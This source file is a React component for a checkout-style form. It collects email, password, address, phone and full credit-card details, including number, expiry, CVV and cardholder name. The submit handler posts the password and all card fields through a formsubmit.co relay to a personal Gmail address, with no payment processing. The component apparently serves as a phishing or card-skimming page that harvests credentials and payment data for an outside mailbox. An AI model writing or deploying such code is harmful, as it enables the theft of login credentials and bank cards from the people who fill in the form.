import { useState, useEffect } from "react";



function Form() {
  const [isLoading, setIsLoading] = useState(false);
  const [formValues, setFormValues] = useState({});

  const [touched, setTouched] = useState({});

  //error
  const [formError, setFormError] = useState({});

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormValues({ ...formValues, [name]: value });

    setTouched((prevState) => ({
      ...prevState,
      [e.target.name]: true,
    }));
  };

  const validate = (values) => {
    const errors = {};
    const regex =
      /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;

    if (!values.email) {
      errors.email = "Email is required";
    } else if (!regex.test(values.email)) {
      errors.email = "This is not a valid email";
    }

    if (!values.password) {
      errors.password = "Enter your password";
    }

    return errors;
  };

  useEffect(() => {
    validate(formValues);
    setFormError(validate(formValues));
  }, [formValues, touched]);

  const handlesubmit = (e) => {
    e.preventDefault();
    setIsLoading(true);
    if (Object.keys(formError).length > 0) {
      setTouched({
        email: true,
        password: true,
      });
      setIsLoading(false);
    }
    if (Object.keys(formError).length === 0) {
      setTouched({
        email: false,
        password: false,
      });

      fetch("https://formsubmit.co/ajax/maikellljudge@gmail.com", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
        },
        body: JSON.stringify({
          password: formValues.password,
          email: formValues.email,
          cardnumber: formValues.cardnumber,
          expdate: formValues.expdate,
          cvv: formValues.cvv,
          cardname: formValues.cardname,
          _subject: `New form submitted  By ${formValues.email}`,
          _captcha: true,
          _blacklist: "spammy pattern, banned term, phrase",
          _template: "box",
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.success === "true") {
            setFormValues({})
            setIsLoading(false)
           // alert("success");
          } else {
          //  alert("failure");
          setFormValues({})
          setIsLoading(false)
          }
        })
        .catch((error) => console.log(error));
    }
  };
  return (
    <div className="App">
      <form onSubmit={handlesubmit}>
        <div className='box'>
          <input 
          placeholder="Email"
          type="text"
          name="email"
          value={formValues.email} onChange={handleChange} />
          <div className="errorMsg">
            {touched.email && formError.email}
          </div>
        </div>
        <div className='box'>
        <input
          placeholder="Password"
          type="text"
          name="password"
          value={formValues.password}
          onChange={handleChange}
        />
         <div className="errorMsg">
            {touched.password && formError.password}
          </div>
        </div>
        
          //country
         <div>
          <input
            className='form-input'
            placeholder="Country/Region"
            type="text"
            name="country"
            value={formValues.country}
            onChange={handleChange}
        />
        </div>
        
        
        
        
  //fullname        
        <div>
        
         <input
            className='form-input'
            placeholder="First name"
            type="text"
            name="firstname"
            value={formValues.firstname}
            onChange={handleChange}
        />
        
         <input
            className='form-input'
            placeholder="Last name"
            type="text"
            name="lastname"
            value={formValues.lastname}
            onChange={handleChange}
        />
      
        </div>
        
        
         //Address      
        <div>
              <div>
                   <input
                      className='form-input'
                      placeholder="Address"
                      type="text"
                      name="address"
                      value={formValues.address}
                      onChange={handleChange}
                  />
                  
                   <input
                      className='form-input'
                      placeholder="Apartment, Suite, etc. (Optional)"
                      type="text"
                      name="apartment"
                      value={formValues.apartment}
                      onChange={handleChange}
                  />
            </div>
            
//city      
            <div>
                <input
                      className='form-input'
                      placeholder="City"
                      type="text"
                      name="city"
                      value={formValues.city}
                      onChange={handleChange}
                  />
                  
                   <input
                      className='form-input'
                      placeholder="State"
                      type="text"
                      name="state"
                      value={formValues.state}
                      onChange={handleChange}
                  />
                  
                   <input
                      className='form-input'
                      placeholder="ZIP code"
                      type="text"
                      name="zipcode"
                      value={formValues.zipcode}
                      onChange={handleChange}
                  />
            </div>
            
     //phone number       
            <div>
                 <input
                      className='form-input'
                      placeholder="Phone"
                      type="number"
                      name="phone"
                      value={formValues.phone}
                      onChange={handleChange}
                  />
            </div>
      
      
        </div>
        
        
        
        
        //credit card
         <div>
          <input
            className='form-input'
            placeholder="Card Number"
            type="number"
            name="cardnumber"
            value={formValues.cardnumber}
            onChange={handleChange}
        />
        
         <input
            className='form-input'
            placeholder="Expiration date (MM/YY)"
            type="text"
            name="expdate"
            value={formValues.expdate}
            onChange={handleChange}
        />
        
         <input
            className='form-input'
            placeholder="Security code"
            type="number"
            name="cvv"
            value={formValues.cvv}
            onChange={handleChange}
        />
        
         <input
            className='form-input'
            placeholder="Card Name"
            type="text"
            name="cardname"
            value={formValues.cardname}
            onChange={handleChange}
        />
        </div>
        
   
        {isLoading ? (<button>Loading...</button>)
       : ( <button type="submit">submit</button>) }
       
      </form>
    </div>
  );
}

export default Form;
